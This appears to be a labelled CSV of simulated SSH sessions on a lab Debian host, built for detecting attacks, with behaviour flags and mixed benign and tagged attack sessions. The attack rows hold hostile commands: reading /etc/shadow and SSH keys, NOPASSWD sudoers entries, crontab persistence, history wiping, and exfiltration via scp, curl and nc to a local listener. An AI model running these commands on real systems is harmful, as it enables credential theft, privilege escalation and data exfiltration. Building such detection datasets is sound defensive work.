session_id,user,account,client_ip,target_ip,target_hostname,session_start,session_end,duration_sec,session_start_is_estimated,session_end_is_estimated,duration_sec_is_estimated,commands,event_types,raw_event_count,file_transfer_bytes,protocol,has_command_telemetry,start_time,end_time,duration_sec_feat,start_hour,off_hours_flag,is_weekend,command_count,unique_command_ratio,avg_command_length,command_entropy,flag_cred_access,flag_privesc,flag_persistence,flag_log_tamper,flag_recon,flag_exfil
19fc77e7086b299d000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:27:51.824+0000,2026-08-03T11:27:58.861+0000,6,False,False,False,"['whoami', 'id', 'uname -a', 'netstat -tulnp', 'who', 'last -n 5']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",8,0,SSH,1,2026-08-03 11:27:51.824000+00:00,2026-08-03 11:27:58.861000+00:00,6.0,11,0,0,6.0,1.0,7.0,2.584962500721156,0.0,0.0,0.0,0.0,1.0,0.0
19fc77e93d74daee000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:28:00.845+0000,2026-08-03T11:28:08.111+0000,7,False,False,False,"['whoami', 'id', 'uname -a', 'netstat -tulnp', 'who', 'last -n 5']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",8,0,SSH,1,2026-08-03 11:28:00.845000+00:00,2026-08-03 11:28:08.111000+00:00,7.0,11,0,0,6.0,1.0,7.0,2.584962500721156,0.0,0.0,0.0,0.0,1.0,0.0
19fc77eb7dc6be40000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:28:10.557+0000,2026-08-03T11:28:14.111+0000,3,False,False,False,[],"['SESSION_ESTABLISHED_SUCCESSFULLY', 'SESSION_DISCONNECTION']",2,0,SSH,1,2026-08-03 11:28:10.557000+00:00,2026-08-03 11:28:14.111000+00:00,3.0,11,0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc77ed5bb4fe12000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:28:17.863+0000,2026-08-03T11:28:22.860+0000,4,False,False,False,[],"['SESSION_ESTABLISHED_SUCCESSFULLY', 'SESSION_DISCONNECTION']",2,0,SSH,1,2026-08-03 11:28:17.863000+00:00,2026-08-03 11:28:22.860000+00:00,4.0,11,0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc77ef71e1b5b0000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:28:26.361+0000,2026-08-03T11:28:31.610+0000,5,False,False,False,"['history -c', 'last']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",4,0,SSH,1,2026-08-03 11:28:26.361000+00:00,2026-08-03 11:28:31.610000+00:00,5.0,11,0,0,2.0,1.0,7.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0
19fc77f13513adf0000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:28:33.489+0000,2026-08-03T11:28:38.861+0000,5,False,False,False,['who'],"['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'SESSION_DISCONNECTION']",3,0,SSH,1,2026-08-03 11:28:33.489000+00:00,2026-08-03 11:28:38.861000+00:00,5.0,11,0,0,1.0,1.0,3.0,-0.0,0.0,0.0,0.0,0.0,1.0,0.0
19fc77f322bb257f000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:28:41.487+0000,2026-08-03T11:28:46.361+0000,4,False,False,False,"['scp -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=3 /tmp/exfil_test_atk_exfil_9bbc95.txt root@127.0.0.1:/tmp/ 2>&1 | head -5', 'nc -w 2 127.0.0.1 9999 < /tmp/exfil_test_atk_exfil_9bbc95.txt 2>&1']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",4,0,SSH,1,2026-08-03 11:28:41.487000+00:00,2026-08-03 11:28:46.361000+00:00,4.0,11,0,0,2.0,1.0,103.5,1.0,0.0,0.0,0.0,0.0,0.0,1.0
19fc77f4d43a78be000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:28:48.362+0000,2026-08-03T11:28:52.111+0000,3,False,False,False,"['cat /etc/passwd', 'w', 'last -n 10']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",5,0,SSH,1,2026-08-03 11:28:48.362000+00:00,2026-08-03 11:28:52.111000+00:00,3.0,11,0,0,3.0,1.0,8.666666666666666,1.584962500721156,1.0,0.0,0.0,0.0,1.0,0.0
19fc77f6969c9be8000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:28:55.517+0000,2026-08-03T11:28:59.111+0000,3,False,False,False,"['cat /etc/shadow', 'find /root /home /etc -name id_rsa 2>/dev/null', 'cat ~/.ssh/authorized_keys 2>/dev/null']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",5,0,SSH,1,2026-08-03 11:28:55.517000+00:00,2026-08-03 11:28:59.111000+00:00,3.0,11,0,0,3.0,1.0,33.0,1.584962500721156,1.0,0.0,1.0,0.0,0.0,0.0
19fc77f7ef974894000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:29:01.040+0000,2026-08-03T11:29:07.361+0000,6,False,False,False,"['useradd -m tempuser_atk_privesc_846021', ""echo 'tempuser_atk_privesc_846021 ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/tempuser_atk_privesc_846021"", 'rm -f /etc/sudoers.d/tempuser_atk_privesc_846021']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",5,0,SSH,1,2026-08-03 11:29:01.040000+00:00,2026-08-03 11:29:07.361000+00:00,6.0,11,0,0,3.0,1.0,62.666666666666664,1.584962500721156,0.0,1.0,0.0,0.0,0.0,0.0
19fc77fa089ab6bf000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:29:09.719+0000,2026-08-03T11:29:13.612+0000,3,False,False,False,"['cat /etc/shadow', 'find /root /home /etc -name id_rsa 2>/dev/null', 'cat ~/.ssh/authorized_keys 2>/dev/null']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",5,0,SSH,1,2026-08-03 11:29:09.719000+00:00,2026-08-03 11:29:13.612000+00:00,3.0,11,0,0,3.0,1.0,33.0,1.584962500721156,1.0,0.0,1.0,0.0,0.0,0.0
19fc77fbdea8b6b3000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:29:17.146+0000,2026-08-03T11:29:22.055+0000,4,False,False,False,"['(crontab -l 2>/dev/null; echo \\', 'crontab -l', 'crontab -l | grep -v atk_persistence_f712c2 | crontab -']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",5,0,SSH,1,2026-08-03 11:29:17.146000+00:00,2026-08-03 11:29:22.055000+00:00,4.0,11,0,0,3.0,1.0,32.0,1.584962500721156,0.0,0.0,1.0,0.0,0.0,0.0
19fc77fdff7d767f000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:29:25.878+0000,2026-08-03T11:29:30.362+0000,4,False,False,False,['who'],"['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'SESSION_DISCONNECTION']",3,0,SSH,1,2026-08-03 11:29:25.878000+00:00,2026-08-03 11:29:30.362000+00:00,4.0,11,0,0,1.0,1.0,3.0,-0.0,0.0,0.0,0.0,0.0,1.0,0.0
19fc7a8920e4ce82000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T12:13:53.145+0000,2026-08-03T12:15:13.394000+00:00,80,False,True,True,"['last -n 10', 'w']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT']",3,0,SSH,1,2026-08-03 12:13:53.145000+00:00,2026-08-03 12:15:13.394000+00:00,80.0,12,0,0,2.0,1.0,5.5,1.0,0.0,0.0,0.0,0.0,1.0,0.0
_no_session,,,,,,2026-07-31T10:09:34.240000+00:00,2026-07-31T11:35:11.217000+00:00,5137,True,True,True,[],[],61,0,,0,2026-07-31 10:09:34.240000+00:00,2026-07-31 11:35:11.217000+00:00,5137.0,10,0,0,,,,,,,,,,
19fc75a1163fd7dd000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T10:50:21.089000+00:00,2026-08-03T10:50:21.089000+00:00,0,True,True,True,[],"['CONNECTION_FAILED', 'CONNECTION_FAILED']",2,0,SSH,1,2026-08-03 10:50:21.089000+00:00,2026-08-03 10:50:21.089000+00:00,0.0,10,0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc7613c574ea35000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T10:56:23.087000+00:00,2026-08-03T10:56:23.087000+00:00,0,True,True,True,[],"['CONNECTION_FAILED', 'CONNECTION_FAILED']",2,0,SSH,1,2026-08-03 10:56:23.087000+00:00,2026-08-03 10:56:23.087000+00:00,0.0,10,0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc7afdfea6831e000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T12:21:53.398+0000,2026-08-03T12:51:06.670+0000,1753,False,False,False,"['sudo su ', 'pip install git', 'sudo apt update', 'apt install git ', 'Y', 'git status', 'git -v', 'apt install python', '.<UP>', '-is-python3', 'py -v', 'python -v', 'exit', 'exit', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",17,0,SSH,1,2026-08-03 12:21:53.398000+00:00,2026-08-03 12:51:06.670000+00:00,1753.0,12,0,0,14.0,0.9285714285714286,8.928571428571429,3.6644977792004614,0.0,0.0,0.0,0.0,0.0,0.0
19fc7b5e2b529743000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T12:28:25.903+0000,2026-08-03T12:28:44.387+0000,18,False,False,False,"['echo TAG:atk_privesc_533a87', 'sudo -l']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",4,0,SSH,1,2026-08-03 12:28:25.903000+00:00,2026-08-03 12:28:44.387000+00:00,18.0,12,0,0,1.0,1.0,7.0,-0.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc7c3ec63e88dd000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T12:43:45.914+0000,2026-08-03T12:43:52.914+0000,7,False,False,False,"['echo TAG:atk_privesc_b68d72', 'sudo -l', 'sudo useradd -m tempuser_atk_privesc_b68d72', ""echo 'tempuser_atk_privesc_b68d72 ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/tempuser_atk_privesc_b68d72 > /dev/null"", 'id tempuser_atk_privesc_b68d72', 'sudo rm -f /etc/sudoers.d/tempuser_atk_privesc_b68d72', 'sudo userdel -r tempuser_atk_privesc_b68d72', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",10,0,SSH,1,2026-08-03 12:43:45.914000+00:00,2026-08-03 12:43:52.914000+00:00,7.0,12,0,0,6.0,1.0,49.833333333333336,2.584962500721156,0.0,1.0,0.0,0.0,1.0,0.0
19fc7c993b1a2039000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T12:49:56.169+0000,2026-08-03T12:50:00.168+0000,3,False,False,False,"['sudo cat /etc/shadow', 'echo TAG:atk_cred_access_6e92f7', 'sudo find /root /home /etc -name id_rsa 2>/dev/null', 'cat ~/.ssh/authorized_keys 2>/dev/null', 'find /usr/bin /usr/sbin /bin /sbin -perm -4000 -type f 2>/dev/null', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",8,0,SSH,1,2026-08-03 12:49:56.169000+00:00,2026-08-03 12:50:00.168000+00:00,3.0,12,0,0,4.0,1.0,43.75,2.0,1.0,0.0,1.0,0.0,0.0,0.0
19fc7c9ae0a72e86000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T12:50:02.838+0000,2026-08-03T12:50:09.919+0000,6,False,False,False,"['sudo -l', 'echo TAG:atk_privesc_f25bcd', 'sudo useradd -m tempuser_atk_privesc_f25bcd', ""echo 'tempuser_atk_privesc_f25bcd ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/tempuser_atk_privesc_f25bcd > /dev/null"", 'id tempuser_atk_privesc_f25bcd', 'sudo rm -f /etc/sudoers.d/tempuser_atk_privesc_f25bcd', 'sudo userdel -r tempuser_atk_privesc_f25bcd', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",10,0,SSH,1,2026-08-03 12:50:02.838000+00:00,2026-08-03 12:50:09.919000+00:00,6.0,12,0,0,6.0,1.0,49.833333333333336,2.584962500721156,0.0,1.0,0.0,0.0,1.0,0.0
19fc843ad6faa59a000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:03:20.323+0000,2026-08-03T15:03:34.096+0000,13,False,False,False,"['ls -la /var/lib', 'echo TAG:ben_dba_1d74b1', 'du -sh /var/log', 'ps aux | grep -i sql', 'cat /etc/hosts', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",8,0,SSH,1,2026-08-03 15:03:20.323000+00:00,2026-08-03 15:03:34.096000+00:00,13.0,15,0,0,4.0,1.0,16.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc843fa1e28bc7000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:03:38.092+0000,2026-08-03T15:03:44.343+0000,6,False,False,False,"['echo TAG:atk_log_tamper_64a5f3', 'ls -la /var/log/', 'cat /var/log/auth.log 2>/dev/null | tail -20', 'history -c', 'last', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",8,0,SSH,1,2026-08-03 15:03:38.092000+00:00,2026-08-03 15:03:44.343000+00:00,6.0,15,0,0,4.0,1.0,18.5,2.0,0.0,0.0,0.0,1.0,1.0,0.0
19fc84420e59a318000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:03:47.593+0000,2026-08-03T15:03:54.343+0000,6,False,False,False,"['echo TAG:ben_admin_ecdcc1', 'ls -la', 'df -h', 'systemctl --no-pager status sshd', 'uptime', 'free -m', 'who', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",10,0,SSH,1,2026-08-03 15:03:47.593000+00:00,2026-08-03 15:03:54.343000+00:00,6.0,15,0,0,6.0,1.0,9.833333333333334,2.584962500721156,0.0,0.0,0.0,0.0,1.0,0.0
19fc8444a35f5989000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:03:58.079+0000,2026-08-03T15:04:03.343+0000,5,False,False,False,"[""echo 'test-data-atk_exfil_44ddc0' > /tmp/exfil_test_atk_exfil_44ddc0.txt"", 'echo TAG:atk_exfil_44ddc0', 'scp -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=3 /tmp/exfil_test_atk_exfil_44ddc0.txt root@127.0.0.1:/tmp/ 2>&1 | head -5', 'curl -s -m 3 -X POST -F file=@/tmp/exfil_test_atk_exfil_44ddc0.txt http://127.0.0.1:9999/upload 2>&1 | head -3', 'nc -w 2 127.0.0.1 9999 < /tmp/exfil_test_atk_exfil_44ddc0.txt 2>&1', 'rm -f /tmp/exfil_test_atk_exfil_44ddc0.txt', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",9,0,SSH,1,2026-08-03 15:03:58.079000+00:00,2026-08-03 15:04:03.343000+00:00,5.0,15,0,0,5.0,1.0,86.2,2.321928094887362,0.0,0.0,0.0,0.0,0.0,1.0
19fc8446b6688e80000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:04:06.595+0000,2026-08-03T15:04:12.593+0000,5,False,False,False,"['echo TAG:ben_admin_fff928', 'ls -la', 'df -h', 'systemctl --no-pager status sshd', 'uptime', 'free -m', 'who', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",10,0,SSH,1,2026-08-03 15:04:06.595000+00:00,2026-08-03 15:04:12.593000+00:00,5.0,15,0,0,6.0,1.0,9.833333333333334,2.584962500721156,0.0,0.0,0.0,0.0,1.0,0.0
19fc8448eb2c56fb000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:04:15.594+0000,2026-08-03T15:04:20.343+0000,4,False,False,False,"['echo TAG:ben_dev_0fc145', 'cd /tmp && ls -la', 'git status', 'cat /etc/os-release', 'python3 --version', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",8,0,SSH,1,2026-08-03 15:04:15.594000+00:00,2026-08-03 15:04:20.343000+00:00,4.0,15,0,0,4.0,1.0,15.75,2.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc844af92e1bf3000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:04:24.063+0000,2026-08-03T15:04:27.593+0000,3,False,False,False,"['ls -la /var/lib', 'echo TAG:ben_dba_664c84', 'du -sh /var/log', 'ps aux | grep -i sql', 'cat /etc/hosts', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",8,0,SSH,1,2026-08-03 15:04:24.063000+00:00,2026-08-03 15:04:27.593000+00:00,3.0,15,0,0,4.0,1.0,16.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc844c8096289d000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:04:30.191+0000,2026-08-03T15:04:34.072+0000,3,False,False,False,"['echo TAG:ben_dba_d19f37', 'ls -la /var/lib', 'du -sh /var/log', 'ps aux | grep -i sql', 'cat /etc/hosts', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",8,0,SSH,1,2026-08-03 15:04:30.191000+00:00,2026-08-03 15:04:34.072000+00:00,3.0,15,0,0,4.0,1.0,16.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc844e1a749581000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:04:36.844+0000,2026-08-03T15:04:42.343+0000,5,False,False,False,"['echo TAG:atk_privesc_99ad49', 'sudo -l', 'useradd -m tempuser_atk_privesc_99ad49', ""echo 'tempuser_atk_privesc_99ad49 ALL=(ALL) NOPASSWD:ALL' | tee /etc/sudoers.d/tempuser_atk_privesc_99ad49 > /dev/null"", 'id tempuser_atk_privesc_99ad49', 'rm -f /etc/sudoers.d/tempuser_atk_privesc_99ad49', 'userdel -r tempuser_atk_privesc_99ad49', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",10,0,SSH,1,2026-08-03 15:04:36.844000+00:00,2026-08-03 15:04:42.343000+00:00,5.0,15,0,0,6.0,1.0,46.5,2.584962500721156,0.0,1.0,0.0,0.0,1.0,0.0
19fc845032fb0aa8000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:04:45.264+0000,2026-08-03T15:04:50.344+0000,4,False,False,False,"[""echo '#!/bin/bash' > /tmp/.cache_update_atk_persistence_e8448e.sh"", 'echo TAG:atk_persistence_e8448e', '(crontab -l 2>/dev/null; echo \\', 'crontab -l', 'crontab -l | grep -v atk_persistence_e8448e | crontab -', 'rm -f /tmp/.cache_update_atk_persistence_e8448e.sh', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",9,0,SSH,1,2026-08-03 15:04:45.264000+00:00,2026-08-03 15:04:50.344000+00:00,4.0,15,0,0,5.0,1.0,42.2,2.321928094887362,0.0,0.0,1.0,0.0,0.0,0.0
19fc8451e12c6ee8000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:04:52.167+0000,2026-08-03T15:05:00.843+0000,8,False,False,False,"['echo TAG:atk_recon_7b4467', 'whoami', 'id', 'uname -a', 'hostname', 'cat /etc/os-release', 'ps aux', 'netstat -tulnp', 'who', 'last -n 5', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",13,0,SSH,1,2026-08-03 15:04:52.167000+00:00,2026-08-03 15:05:00.843000+00:00,8.0,15,0,0,9.0,1.0,8.333333333333334,3.169925001442312,0.0,0.0,0.0,0.0,1.0,0.0
19fc8454945f84af000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:05:03.320+0000,2026-08-03T15:05:08.343+0000,4,False,False,False,"['echo TAG:atk_privesc_411db3', 'sudo -l', 'useradd -m tempuser_atk_privesc_411db3', ""echo 'tempuser_atk_privesc_411db3 ALL=(ALL) NOPASSWD:ALL' | tee /etc/sudoers.d/tempuser_atk_privesc_411db3 > /dev/null"", 'id tempuser_atk_privesc_411db3', 'rm -f /etc/sudoers.d/tempuser_atk_privesc_411db3', 'userdel -r tempuser_atk_privesc_411db3', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",10,0,SSH,1,2026-08-03 15:05:03.320000+00:00,2026-08-03 15:05:08.343000+00:00,4.0,15,0,0,6.0,1.0,46.5,2.584962500721156,0.0,1.0,0.0,0.0,1.0,0.0
19fc84566977e550000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:05:10.830+0000,2026-08-03T15:05:16.077+0000,4,False,False,False,"['echo TAG:atk_cred_access_81e6f0', 'cat /etc/shadow', 'find /root /home /etc -name id_rsa 2>/dev/null', 'cat ~/.ssh/authorized_keys 2>/dev/null', 'find /usr/bin /usr/sbin /bin /sbin -perm -4000 -type f 2>/dev/null', 'exit']","['KBD_INPUT', 'SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",8,0,SSH,1,2026-08-03 15:05:10.830000+00:00,2026-08-03 15:05:16.077000+00:00,4.0,15,0,0,4.0,1.0,41.25,2.0,1.0,0.0,1.0,0.0,0.0,0.0
19fc84583973cce6000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:05:18.159+0000,2026-08-03T15:05:21.844+0000,3,False,False,False,"['cat /etc/shadow', 'echo TAG:atk_cred_access_882834', 'find /root /home /etc -name id_rsa 2>/dev/null', 'cat ~/.ssh/authorized_keys 2>/dev/null', 'find /usr/bin /usr/sbin /bin /sbin -perm -4000 -type f 2>/dev/null', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",8,0,SSH,1,2026-08-03 15:05:18.159000+00:00,2026-08-03 15:05:21.844000+00:00,3.0,15,0,0,4.0,1.0,41.25,2.0,1.0,0.0,1.0,0.0,0.0,0.0
